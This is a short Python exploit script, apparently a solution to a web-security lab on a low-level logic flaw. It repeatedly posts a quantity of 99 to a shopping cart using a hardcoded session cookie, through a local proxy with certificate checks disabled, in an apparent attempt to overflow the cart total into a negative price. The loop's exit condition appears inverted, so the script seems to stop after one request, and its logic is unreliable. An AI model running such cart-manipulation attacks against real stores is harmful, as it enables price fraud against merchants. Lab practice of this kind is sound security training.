import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def add_quantity_to_cart(url):
	for i in range(100):
		path = '/cart'
		data = {"productId":1, "redir":"CART", "quantity":99}
		cookies = {"session":"MtV9j6maeu8PA0Ck2695nJyOi5y4ao8k"}
		r = requests.post(url + path, verify=False, proxies=proxies, cookies=cookies, data=data)
		res = r.text
		
		soup = BeautifulSoup(res, 'html.parser')
		total = soup.find('th', text = re.compile('\$')).text
		print(total)
		if float(total.replace("$", "")) > -100:
			break

	
		
if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print("[-] Usage: %s <url>" % sys.argv[0])
		print("[-] Example: %s www.example.com" % sys.argv[0])
		sys.exit(-1)
		
	print("[+] Adding quantity")
	add_quantity_to_cart(url)
